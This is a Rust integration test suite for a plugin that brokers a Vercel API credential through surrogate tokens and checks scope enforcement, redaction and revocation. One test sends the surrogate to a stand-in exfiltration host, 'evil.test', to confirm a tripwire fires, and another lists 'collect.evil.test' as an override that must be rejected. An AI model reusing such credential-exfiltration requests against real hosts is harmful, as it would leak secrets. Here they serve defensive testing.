//! The installed plugin as a real process, redeeming a connection's
//! credential at a loopback TLS upstream standing in for `api.vercel.com`.
//!
//! Built only with the `upstream-override` feature (see Cargo.toml): the
//! override is how a test puts the real credential on a wire it can read, and
//! a shipped build has no such door (`shipped_build.rs`).

mod plugin_support;
mod support;

use std::time::Duration;

use plugin_support::{through_proxy, wait_for, Install, Plugin};
use serde_json::{json, Value};
use support::stub::{spawn_upstream, Upstream};

const HOST: &str = "api.vercel.com";
const TOKEN: &str = "CANARY-vercel-token-77ab-only-the-upstream-may-see";
const OVERRIDE_ENV: &str = "OPENSESAME_SURROGATE_TEST_UPSTREAM";

fn spec(install: &Install, run_id: &str) -> Value {
    json!({
        "run_id": run_id,
        "ttl_secs": 60,
        "entries": [{
            "env_var": "VERCEL_TOKEN",
            "provider_id": "vercel",
            "connection_ref": "conn://acme/vercel",
            "site": "authorization",
            "methods": ["GET"],
            "path_prefixes": ["/v2/user"],
        }],
        "credentials": [{ "connection_ref": "conn://acme/vercel", "secret": TOKEN }],
        "notices_path": install.notices(),
    })
}

fn request(method: &str, path: &str, authorization: Option<&str>) -> String {
    let auth = authorization.map_or(String::new(), |a| format!("Authorization: Bearer {a}\r\n"));
    format!(
        "{method} {path} HTTP/1.1\r\nHost: {HOST}\r\n{auth}Accept: application/json\r\n\
         Content-Length: 0\r\nConnection: close\r\n\r\n"
    )
}

/// The plugin, its upstream override pointed at `upstream`, and its reply.
fn started(install: &Install, upstream: &Upstream, run_id: &str) -> (Plugin, Value, String) {
    let ca = install.dir.path().join("upstream-ca.pem");
    std::fs::write(&ca, upstream.ca.ca_pem()).unwrap();
    let value = format!("{HOST}={},ca={}", upstream.addr, ca.display());
    let mut plugin = install.spawn(&[(OVERRIDE_ENV, &value)]);
    plugin.send(&spec(install, run_id));
    let reply = plugin.reply();
    let surrogate = reply["env"]["VERCEL_TOKEN"]
        .as_str()
        .unwrap_or_else(|| panic!("a surrogate for VERCEL_TOKEN: {reply}"))
        .to_owned();
    (plugin, reply, surrogate)
}

#[tokio::test(flavor = "multi_thread")]
async fn the_upstream_receives_the_real_credential_at_the_declared_host_and_header() {
    let upstream = spawn_upstream(HOST).await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = started(&install, &upstream, "dev-run-u1");
    assert!(surrogate.starts_with("osr_"));
    assert_ne!(surrogate, TOKEN);

    let (status, body) = through_proxy(&reply, HOST, &request("GET", "/v2/user", Some(&surrogate)))
        .await
        .expect("brokered");
    assert_eq!(status, 200, "{body}");
    assert_eq!(body, "{\"login\":\"octo\"}");

    let hits = upstream.hits();
    assert_eq!(hits.len(), 1, "one call, one upstream request");
    assert_eq!(hits[0].path, "/v2/user");
    assert_eq!(
        hits[0].authorization.as_deref(),
        Some(&*format!("Bearer {TOKEN}")),
        "the real credential, in the Authorization header"
    );
    for value in &hits[0].all_values {
        assert!(
            !value.contains(&surrogate),
            "the surrogate never goes upstream"
        );
    }
    assert_eq!(
        hits[0]
            .all_values
            .iter()
            .filter(|v| v.contains(TOKEN))
            .count(),
        1,
        "placed exactly once"
    );
    // Nothing the child was told holds the token.
    assert!(!reply.to_string().contains(TOKEN));

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_request_outside_the_scope_or_without_a_surrogate_never_carries_the_credential() {
    let upstream = spawn_upstream(HOST).await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = started(&install, &upstream, "dev-run-u2");

    for (label, raw) in [
        (
            "path outside the declared prefix",
            request("GET", "/v9/projects", Some(&surrogate)),
        ),
        (
            "method outside the declared methods",
            request("POST", "/v2/user", Some(&surrogate)),
        ),
        (
            "a sibling of the prefix",
            request("GET", "/v2/user-private", Some(&surrogate)),
        ),
        ("no surrogate at all", request("GET", "/v2/user", None)),
        (
            "a guessed surrogate",
            request(
                "GET",
                "/v2/user",
                Some("osr_00000000000000000000000000000000"),
            ),
        ),
        (
            "a token of the child's own",
            request("GET", "/v2/user", Some("vc_child_made_up")),
        ),
    ] {
        let (status, body) = through_proxy(&reply, HOST, &raw)
            .await
            .unwrap_or_else(|| panic!("{label}: answered"));
        assert_eq!(status, 403, "{label}: {body}");
        assert!(
            !body.contains(TOKEN) && !body.contains(&surrogate),
            "{label}"
        );
    }
    assert!(upstream.hits().is_empty(), "nothing reached the upstream");

    // The refusals are noticed, never carrying the surrogate or the token.
    let notices = wait_for(&install.notices(), "surrogate.out_of_scope");
    assert!(notices.contains("surrogate.out_of_scope"), "{notices}");
    assert!(
        !notices.contains(&surrogate) && !notices.contains(TOKEN),
        "{notices}"
    );

    // The in-scope call still works: scope refusals do not revoke the run.
    let (status, _) = through_proxy(&reply, HOST, &request("GET", "/v2/user", Some(&surrogate)))
        .await
        .unwrap();
    assert_eq!(status, 200);
    assert_eq!(upstream.hits().len(), 1);

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_surrogate_sent_elsewhere_revokes_the_run_and_the_credential_is_never_spent() {
    let upstream = spawn_upstream(HOST).await;
    let install = Install::pinned(true);
    let (mut plugin, reply, surrogate) = started(&install, &upstream, "dev-run-u3");

    let (status, _) = through_proxy(
        &reply,
        "evil.test",
        &request("GET", "/v2/user", Some(&surrogate)).replace(HOST, "evil.test"),
    )
    .await
    .expect("the proxy terminates the exfiltration host");
    assert_eq!(status, 403);
    let event = plugin.reply();
    assert_eq!(event["event"], "tripwire", "{event}");

    let (status, _) = through_proxy(&reply, HOST, &request("GET", "/v2/user", Some(&surrogate)))
        .await
        .expect("a late use is seen");
    assert_eq!(status, 403);
    assert!(upstream.hits().is_empty());
    let notices = wait_for(&install.notices(), "surrogate.revoked");
    assert!(notices.contains("surrogate.revoked"), "{notices}");

    drop(plugin.stdin.take());
    assert_eq!(plugin.exit_within(Duration::from_secs(10)), Some(0));
}

#[tokio::test(flavor = "multi_thread")]
async fn an_unusable_override_ends_the_process_before_any_run_starts() {
    let install = Install::pinned(true);
    for value in [
        "api.vercel.com=10.0.0.5:8443,ca=/nonexistent.pem",
        "collect.evil.test=127.0.0.1:8443,ca=/nonexistent.pem",
        "api.vercel.com=127.0.0.1:8443,ca=/nonexistent.pem",
        "nonsense",
    ] {
        let mut plugin = install.spawn(&[(OVERRIDE_ENV, value)]);
        assert_eq!(
            plugin.exit_within(Duration::from_secs(10)),
            Some(2),
            "{value}"
        );
        assert_eq!(plugin.rest(), "", "{value}: no reply");
    }
}
